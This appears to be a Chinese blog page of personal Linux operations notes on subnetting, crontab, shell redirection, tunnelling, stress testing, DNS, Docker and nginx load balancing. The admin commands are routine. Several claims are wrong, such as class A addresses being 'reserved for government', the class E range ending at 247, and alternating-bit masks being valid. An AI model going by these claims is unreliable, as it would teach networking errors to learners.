<h3 id="网络知识之-IP-与子网掩码"><a href="#网络知识之-IP-与子网掩码" class="headerlink" title="网络知识之 IP 与子网掩码"></a>网络知识之 IP 与子网掩码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">IP 地址是一种在 Internet 上的给主机编址的方式，也称为网际协议地址。IP 地址是 IP 协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。常见的 IP 地址，分为 IPv4 与 IPv6 两大类。主要介绍的是 IPv4 这一类。 IP 地址是一个 <span class="number">32</span> 位的二进制数，但为了方便记忆，通常被分割为 <span class="number">4</span> 个 <span class="string">"8 位二进制数"</span>，并且用 <span class="string">"点分十进制"</span> 表示为 a.b.c.d 的形式，其中 a,b,c,d 都是 <span class="number">0</span>~<span class="number">255</span> 之间的十进制整数。</span><br><span class="line"></span><br><span class="line">IP 地址分为五类，各类可容纳的地址数目不同：</span><br><span class="line"></span><br><span class="line">A 类保留给政府机构（<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> 到 <span class="number">127.255</span><span class="number">.255</span><span class="number">.255</span>）</span><br><span class="line"></span><br><span class="line">B 类分配给中等规模的公司（<span class="number">128.0</span><span class="number">.0</span><span class="number">.0</span> 到 <span class="number">191.255</span><span class="number">.255</span><span class="number">.255</span>）</span><br><span class="line"></span><br><span class="line">C 类分配给任何需要的人（<span class="number">192.0</span><span class="number">.0</span><span class="number">.0</span> 到 <span class="number">223.255</span><span class="number">.255</span><span class="number">.255</span>）</span><br><span class="line"></span><br><span class="line">D 类用于组播（<span class="number">224.0</span><span class="number">.0</span><span class="number">.0</span>--<span class="number">-239.255</span><span class="number">.255</span><span class="number">.255</span>）</span><br><span class="line"></span><br><span class="line">E 类用于实验（<span class="number">240.0</span><span class="number">.0</span><span class="number">.0</span>--<span class="number">-247.255</span><span class="number">.255</span><span class="number">.255</span>）</span><br><span class="line"></span><br><span class="line">A、B、C 三类中 IP 地址 = 网络地址 + 主机地址，而 D、E 两类不区分网络地址和主机地址</span><br><span class="line"></span><br><span class="line">特殊说明：</span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）A 类中的 <span class="number">10.</span>X.X.X 是私有地址；<span class="number">127.</span>X.X.X 是保留地址</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）B 类中的 <span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>~<span class="number">172.31</span><span class="number">.255</span><span class="number">.255</span> 是私有地址</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）C 类中的 <span class="number">192.168</span>.X.X 是私有地址</span><br><span class="line">网络地址可以简单理解我们平时常说的网段</span><br><span class="line"></span><br><span class="line">主机地址则是在这个网段中不同设备的地址</span><br><span class="line">子网掩码只有一个作用，就是将一个 IP 地址划分成网络地址和主机地址两部分。</span><br><span class="line"></span><br><span class="line">（常见的掩码是由一连串 <span class="number">1</span> + 一连串 <span class="number">0</span> 构成的，不过看网上资料也说 <span class="number">1</span> 和 <span class="number">0</span> 交替也是可以的）</span><br><span class="line"></span><br><span class="line">默认分配的子网掩码每段只有 <span class="number">255</span> 或 <span class="number">0</span></span><br><span class="line"></span><br><span class="line">A 类的默认子网掩码　<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">B 类的默认子网掩码　<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span>　　</span><br><span class="line">C 类的默认子网掩码　<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">子网掩码与 IP 地址一样是 <span class="number">32</span> 位地址，然后将 IP 地址与子网掩码进行与运算即可得到网络地址。</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line"></span><br><span class="line">IP地址为<span class="number">192.168</span><span class="number">.10</span><span class="number">.2</span>，子网掩码为<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span>。</span><br><span class="line">先将十进制转换成二进制：</span><br><span class="line">IP地址：  <span class="number">11000000</span> <span class="number">10101000</span> <span class="number">00001010</span> <span class="number">00000010</span></span><br><span class="line">子网掩码： <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11110000</span></span><br><span class="line">进行与运算：－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line">          <span class="number">11000000</span> <span class="number">10101000</span> <span class="number">00001010</span> <span class="number">00000000</span></span><br><span class="line">则可得其网络标识为<span class="number">192.168</span><span class="number">.10</span><span class="number">.0</span>，主机标识为<span class="number">2</span>。</span><br><span class="line"><span class="number">3.</span> 掩码的不同表示形式</span><br><span class="line"></span><br><span class="line">已经说过了子网掩码也是 <span class="number">32</span> 位的地址，那么开头的 <span class="number">25</span> 怎么转化呢？</span><br><span class="line"></span><br><span class="line"><span class="number">25</span> 的意思是网络号为 <span class="number">25</span>，就代表连续的 <span class="number">25</span> 个 <span class="number">1</span>，然后剩下的用 <span class="number">0</span> 补齐</span><br><span class="line"></span><br><span class="line">即 <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">10000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 包含的其他信息</span><br><span class="line"></span><br><span class="line">还是以这个信息为例：XX.XX.XX<span class="number">.128</span>/<span class="number">25</span>，我们还可以拿到什么信息呢？</span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）主机号：主机号 + 网络号 = <span class="number">32</span>，<span class="number">32</span><span class="number">-25</span>=<span class="number">7</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）网络地址：当 <span class="number">7</span> 位主机号全为 <span class="number">0</span>，也就是 XX.XX.XX<span class="number">.128</span></span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）广播地址：当 <span class="number">7</span> 位主机号全为 <span class="number">1</span>，也就是 XX.XX.XX<span class="number">.255</span></span><br><span class="line"></span><br><span class="line">（<span class="number">4</span>）可用地址数量：<span class="number">7</span> 位主机号有 <span class="number">2</span>^<span class="number">7</span> 种结果，但是要去掉网络地址和广播地址，即：<span class="number">2</span>^<span class="number">7</span><span class="number">-2</span>=<span class="number">126</span> (这个也就是运维所说的一百多个 ip)https:<span class="comment">//learnku.com/articles/35666</span></span><br></pre></td></tr></table></figure>
<h3 id="ssh免密登录漏洞"><a href="#ssh免密登录漏洞" class="headerlink" title="ssh免密登录漏洞"></a>ssh免密登录漏洞</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ll .ssh/</span><br><span class="line">total <span class="number">42944</span></span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">43918390</span> Nov  <span class="number">6</span>  <span class="number">2017</span> authorized_keys</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root     <span class="number">3415</span> Apr <span class="number">26</span>  <span class="number">2019</span> known_hosts</span><br><span class="line">[root@localhost ~]# cat .ssh/known_hosts</span><br><span class="line">git.coding.net,<span class="number">221.193</span><span class="number">.246</span><span class="number">.6</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHOWdwLpkos2CLli6DFvQ36yQE6Pe/PtFp3XwyirfZCIoGWnedaWI8zkJWVCs0wgOB9/urFepTDfV2wN49KGy1sl2/CCDEH2K/zeoEAZlTcBrhU17bwg1yMHCyJ7IM+zdLzItDEKYjgoWqVdUGK1dXQQlwt7GP4W7HqffelQQoVxOMoZ5N50MzD+nvV4y8iq0KwDQNy62iU4hui9ajCSVUDLu/<span class="number">06</span>ucd5IojSI9keRIYAXvQf52TJ5EbvoBggp9RhjuWNEG8IhnPP6rzPS11Ocmwg/Hs</span><br><span class="line">打开 vi authorized_keys 并没有任何东西。然后我顺带把其它 /root/.ssh/ 下的四个文件都翻了一遍。</span><br><span class="line">才发现 known_hosts 文件中多了两个 IP 地址为新加坡的 ssh key  https:<span class="comment">//learnku.com/articles/35888</span></span><br></pre></td></tr></table></figure>
<h3 id="crontab-指定用户"><a href="#crontab-指定用户" class="headerlink" title="crontab 指定用户"></a>crontab 指定用户</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">直接在 /etc/crontab 中编辑定时任务即可，加上用户名</span><br><span class="line">SHELL=<span class="regexp">/bin/</span>sh</span><br><span class="line">PATH=<span class="regexp">/usr/</span>local/sbin:<span class="regexp">/usr/</span>local/bin:<span class="regexp">/sbin:/</span>bin:<span class="regexp">/usr/</span>sbin:<span class="regexp">/usr/</span>bin</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line"><span class="number">17</span> *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># cron</span><br><span class="line">* * * * *  www-data flock /tmp/flock1.lock -c <span class="string">'timeout 200 /usr/local/bin/php /var/www/html/laravel/artisan command &gt;&gt; /home/log/laravel.log 2&gt;&amp;1'</span></span><br><span class="line">flock 用来防止重复执行，起到原子锁作用</span><br><span class="line">                                                                                                                                                  timeout 表示这个脚本执行过长，咱就干死它，可以有效避免各种循环或长时间占用问题</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35948</span></span><br><span class="line"></span><br><span class="line">* * * * * flock -xn /tmp/test.lock -c <span class="string">"timeout 200 php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1"</span> </span><br><span class="line">想 <span class="number">10</span>s 执行一次怎么办？</span><br><span class="line"></span><br><span class="line">* * * * * php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">* * * * * ( sleep <span class="number">10</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">20</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">30</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">40</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">50</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br></pre></td></tr></table></figure>
<h3 id="gt-gt-gt"><a href="#gt-gt-gt" class="headerlink" title="&gt;  &gt;&gt;"></a>&gt;  &gt;&gt;</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; 表示覆盖追加</span><br><span class="line">&gt;&gt; 表示尾部追加</span><br><span class="line">这两个管道操作符，在执行期间发生错误时，是不会将错误输出写入后面的「文件」中的。</span><br><span class="line">在 Linux 系统中 <span class="number">0</span>、<span class="number">1</span>、<span class="number">2</span> 分别表示不同的设备类型，其中</span><br><span class="line"></span><br><span class="line"><span class="number">0</span> 标准输入设备，指键盘</span><br><span class="line"><span class="number">1</span> 标准正确输出设备</span><br><span class="line"><span class="number">2</span> 标准错误输出设备</span><br><span class="line">php artisan command &gt;&gt; <span class="regexp">/home/</span>log/laravel.log <span class="number">2</span>&gt;&amp;<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">上面命令的意思是将 php artisan command 的 标准正确输出 重定向到 laravel.log 文件。</span></span><br><span class="line"><span class="string">而后面的 2&gt;&amp;1 是表示将标注错误输出重定向到标准正确输出。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">从而达到错误输出和正确输出都记录在 laravel.log 文件中。</span></span><br></pre></td></tr></table></figure>
<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//serveo.net/</span></span><br><span class="line">λ ssh -R <span class="number">80</span>:localhost:<span class="number">3000</span> serveo.net</span><br><span class="line">Forwarding HTTP traffic <span class="keyword">from</span> https:<span class="comment">//habeo.serveo.net</span></span><br><span class="line">Press g to start a GUI session and ctrl-c to quit.</span><br></pre></td></tr></table></figure>
<h3 id="ab-压力测试"><a href="#ab-压力测试" class="headerlink" title="ab 压力测试"></a>ab 压力测试</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ab -n <span class="number">2000</span> -c <span class="number">1000</span> http:<span class="comment">//www.xxx.com/index.php</span></span><br><span class="line">需要调整内核参数以支持端口重用</span><br><span class="line">假如我现在使用的是 Linux 服务器，找到如下文件</span><br><span class="line">sudo vim /etc/sysctl.conf</span><br><span class="line">添加如下内容</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_syncookies = <span class="number">1</span></span><br><span class="line">net.ipv4.tcp_tw_reuse = <span class="number">1</span></span><br><span class="line">net.ipv4.tcp_tw_recycle = <span class="number">1</span></span><br><span class="line">net.ipv4.tcp_fin_timeout = <span class="number">30</span></span><br><span class="line">kernel.printk = <span class="number">7</span> <span class="number">4</span> <span class="number">1</span> <span class="number">7</span></span><br><span class="line">运行 sudo sysctl –p 生效</span><br><span class="line">https:<span class="comment">//learnku.com/articles/4765/simple-primary-stress-test</span></span><br></pre></td></tr></table></figure>
<h3 id="https-证书注册工具"><a href="#https-证书注册工具" class="headerlink" title="https 证书注册工具"></a>https 证书注册工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install certbot python-certbot-nginx</span><br><span class="line">certbot --nginx</span><br><span class="line">certbot renew --dry-run</span><br><span class="line"></span><br><span class="line">https://certbot.eff.org/</span><br></pre></td></tr></table></figure>
<h3 id="linux卡顿怎么排查"><a href="#linux卡顿怎么排查" class="headerlink" title="linux卡顿怎么排查"></a>linux卡顿怎么排查</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep php | awk <span class="string">'&#123;print $2&#125;'</span> | xargs kill <span class="number">-9</span></span><br><span class="line">查看内存使用状况：free -g</span><br><span class="line">查看磁盘使用状况：df -h</span><br><span class="line">查看磁盘I/O使用：iostat -dx</span><br><span class="line">查看CPU使用：top</span><br><span class="line"></span><br><span class="line">awk <span class="string">'条件类型 1&#123;动作1&#125; 条件类型2&#123;动作2&#125; ...'</span> filename</span><br><span class="line">awk后面接两个引号并加上大括号来设置想要对数据进行的处理动作。https:<span class="comment">//tsmliyun.github.io/linux/%E4%B8%80%E6%AC%A1%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</span></span><br></pre></td></tr></table></figure>
<h3 id="docker-1"><a href="#docker-1" class="headerlink" title="docker"></a>docker</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -L <span class="string">"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)"</span> -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">[root@VM_0_11_centos html]# docker-compose version</span><br><span class="line">docker-compose version <span class="number">1.24</span><span class="number">.1</span>, build <span class="number">4667896</span>b</span><br><span class="line">docker-py version: <span class="number">3.7</span><span class="number">.3</span></span><br><span class="line">CPython version: <span class="number">3.6</span><span class="number">.8</span></span><br><span class="line">OpenSSL version: OpenSSL <span class="number">1.1</span><span class="number">.0</span>j  <span class="number">20</span> Nov <span class="number">2018</span></span><br><span class="line"> docker pull gogs/gogs</span><br><span class="line"> [root@VM_0_11_centos html]# docker start gogs</span><br><span class="line"> gogs</span><br><span class="line"> [root@VM_0_11_centos html]# docker ps</span><br><span class="line"> CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS</span><br><span class="line">   PORTS                                            NAMES</span><br><span class="line"> <span class="number">1</span>bd82406bba2        gogs/gogs           <span class="string">"/app/gogs/docker/st…"</span>   <span class="number">7</span> hours ago         Up <span class="number">7</span> hours</span><br><span class="line">   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">10022</span>-&gt;<span class="number">22</span>/tcp, <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">10080</span>-&gt;<span class="number">3000</span>/tcp   gogs</span><br><span class="line">   </span><br><span class="line">   https:<span class="comment">//learnku.com/articles/34941</span></span><br></pre></td></tr></table></figure>
<h3 id="cURL-error-28-Resolving-timed-out-after-5515-milliseconds"><a href="#cURL-error-28-Resolving-timed-out-after-5515-milliseconds" class="headerlink" title="cURL error 28: Resolving timed out after 5515 milliseconds"></a>cURL error 28: Resolving timed out after 5515 milliseconds</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/resolv.conf</span><br><span class="line">不要手动修改 /etc/resolv.conf，因为此文件动态生成的，先看下文件：</span><br><span class="line"></span><br><span class="line">$ cat /etc/network/interfaces</span><br><span class="line">最后一行的 dns-nameservers 是我们的目标，开始修改：</span><br><span class="line"></span><br><span class="line">$ vi /etc/network/interfaces</span><br><span class="line">比较知名的公共 DNS 可以请问这里查看 https:<span class="comment">//www.ip.cn/dns.html ，这里选择 114 和 阿里的 DNS:</span></span><br><span class="line"></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet <span class="keyword">static</span></span><br><span class="line">address <span class="number">10.</span>x<span class="number">.23</span>.xxx</span><br><span class="line">netmask <span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">gateway <span class="number">10.</span>x<span class="number">.0</span>.x</span><br><span class="line">mtu <span class="number">1454</span></span><br><span class="line">dns-nameservers <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span> <span class="number">114.114</span><span class="number">.115</span><span class="number">.115</span> <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">最后面 dns-nameservers 是 DNS ，修改最后一行即可，修改完成后：</span><br><span class="line"></span><br><span class="line">$ ifdown eth0 &amp;&amp; sudo ifup eth0</span><br><span class="line">重启成功后，确认是否应用上：</span><br><span class="line"></span><br><span class="line">$ cat /etc/resolv.conf</span><br><span class="line">可以看到输出：</span><br><span class="line"></span><br><span class="line"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class="line">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class="line">nameserver <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line">nameserver <span class="number">114.114</span><span class="number">.115</span><span class="number">.115</span></span><br><span class="line">nameserver <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">https:<span class="comment">//learnku.com/ubuntu/t/32705</span></span><br></pre></td></tr></table></figure>
<h3 id="内存消耗最大的进程"><a href="#内存消耗最大的进程" class="headerlink" title="内存消耗最大的进程"></a>内存消耗最大的进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_11_centos html]# ps aux --sort -rss | head</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root      <span class="number">3367</span>  <span class="number">0.0</span>  <span class="number">3.9</span> <span class="number">523176</span> <span class="number">74068</span> ?        Ssl  Nov14   <span class="number">0</span>:<span class="number">53</span> /usr/bin/dockerd -H fd:<span class="comment">// --containerd</span></span><br><span class="line">=<span class="regexp">/run/</span>containerd/containerd.sock</span><br><span class="line">ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head</span><br><span class="line">如果你只想查看命令名称而不是命令的绝对路径，请使用下面的 ps 命令格式。</span><br><span class="line"></span><br><span class="line"># ps -eo pid,ppid,%mem,%cpu,comm --sort=-%mem | head</span><br><span class="line"># top -c -b -o +%MEM | head -n 20 | tail -15</span><br><span class="line">如果你只想查看命令名称而不是命令的绝对路径，请使用下面的 top 命令格式。</span><br><span class="line"></span><br><span class="line"># top -b -o +%MEM | head -n 20 | tail -15</span><br><span class="line">https:<span class="comment">//cn.v2ex.com/t/619291#</span></span><br></pre></td></tr></table></figure>
<h3 id="Nginx-负载均衡"><a href="#Nginx-负载均衡" class="headerlink" title="Nginx 负载均衡"></a>Nginx 负载均衡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">语法: upstream name &#123; ... &#125; </span><br><span class="line">默认值: —</span><br><span class="line">上下文: http</span><br><span class="line"></span><br><span class="line">upstream 指令当中包含server指令</span><br><span class="line">语法: server address [parameters]; </span><br><span class="line">上下文: upstream</span><br><span class="line"></span><br><span class="line">例子:</span><br><span class="line">upstream backend &#123;</span><br><span class="line">    server backend1.example.com:<span class="number">8081</span> weight=<span class="number">4</span> max_fails=<span class="number">2</span> fail_timeout=<span class="number">30</span>s; </span><br><span class="line">    server backend2.example.com:<span class="number">8080</span> weight=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">server &#123; </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http:<span class="comment">//backend; </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">参数说明:</span><br><span class="line">weight=number 设定服务器的权重，默认是<span class="number">1</span>，权重越大被访问机会越大，可以根据机器的配置情况来配置。</span><br><span class="line"></span><br><span class="line">max_fails=number 设定Nginx与服务器通信的尝试失败的次数。在fail_timeout参数定义的时间段内，如果失败的次数达到此值，Nginx就认为服务器不 可用。在下一个fail_timeout时间段，服务器不会再被尝试。 失败的尝试次数默认是<span class="number">1</span>。</span><br><span class="line"></span><br><span class="line">默认配置时，http_404状态不被认为是失败的尝试。 可以通过指令proxy_next_upstream 和memcached_next_upstream来配置什么是失败的尝试。</span><br><span class="line"></span><br><span class="line">fail_timeout=time</span><br><span class="line">统计失败尝试次数的时间段。在这段时间中，服务器失败次数达到指定的尝试次数，服务器就被认为不可用。默认情况下，该超时时间是<span class="number">10</span>秒。 </span><br><span class="line"></span><br><span class="line">backup</span><br><span class="line">标记为备用服务器。当主服务器不可用以后，请求会被传给这些服务器，配置这个指令可以实现故障转移。</span><br><span class="line"></span><br><span class="line">down 标记服务器永久不可用，可以跟ip_hash指令一起使用。</span><br><span class="line">https:<span class="comment">//learnku.com/articles/36737</span></span><br></pre></td></tr></table></figure>
